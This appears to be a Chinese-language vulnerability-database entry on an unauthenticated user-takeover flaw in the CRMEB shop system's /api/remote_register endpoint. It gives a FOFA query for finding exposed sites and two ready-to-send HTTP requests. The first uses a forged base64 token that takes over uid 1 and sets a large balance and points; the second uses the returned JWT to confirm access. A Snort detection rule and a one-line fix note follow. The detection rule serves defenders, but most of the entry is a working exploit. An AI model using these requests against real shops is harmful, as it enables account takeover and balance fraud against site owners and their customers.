# CRMEB-remote_register-未授权任意用户接管

CRMEB-remote_register-未授权任意用户接管

# 影响版本

v5.4.0、v5.6.1、v5.6.3.1、v6.0.0

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  **body=&quot;/wap/first/zsff/iconfont/iconfont.css&quot; || body=&quot;CRMEB&quot;**

**POC/EXP：**

**step1 当uid存在时会修改积分信息并返回可用token**

```
GET /api/remote_register?remote_token=eyJ1aWQiOjEsInBob25lIjoiIiwibmlja25hbWUiOiJ0ZXN0IiwiYXZhdGFyIjoiIiwibm93X21vbmV5Ijo5OTk5OTkuOTksImludGVncmFsIjo5OTk5OTksImV4cCI6MH0 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36


```

​![image](assets/image-20260913160245-wwjbjkh.png)​

**step2 验证**

```
GET /api/userinfo HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJkNDFkOGNkOThmMDBiMjA0ZTk4MDA5OThlY2Y4NDI3ZSIsImlzcyI6Ind3dy5ldjM2MC5jbiIsImF1ZCI6Ind3dy5ldjM2MC5jbiIsImlhdCI6MTc4OTI4NjMxNSwibmJmIjoxNzg5Mjg2MzE1LCJleHAiOjE3OTE4NzgzMTUsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFwaSJ9fQ.UyPiad78n9sa0lhKVS8gc-4HE6d4mZMl1EofsDwCajg


```

​![image](assets/image-20260913160346-j7gyz7v.png)​

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"CRMEB - /api/userinfo 未授权任意用户接管漏洞 (Authori-zation JWT pwd=空密码)";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri;
        content:"/api/userinfo";
        fast_pattern;
    http.header;
        content:"Authori-zation|3a| Bearer "; nocase;
        content:"eyJwd2QiOiJkNDFkOGNkOThmMDBiMjA0ZTk4MDA5OThlY2Y4NDI3ZSIs"; distance:0; nocase;
    metadata:
        service http,
        affected_product "CRMEB",
        vulnerability_type "Unauthorized User Account Takeover",
        severity "critical";
    classtype:web-application-attack;
    sid:1000731;
    rev:1;
    priority:1;
)
```

# 漏洞修复

建议用户更新至最新补丁

‍
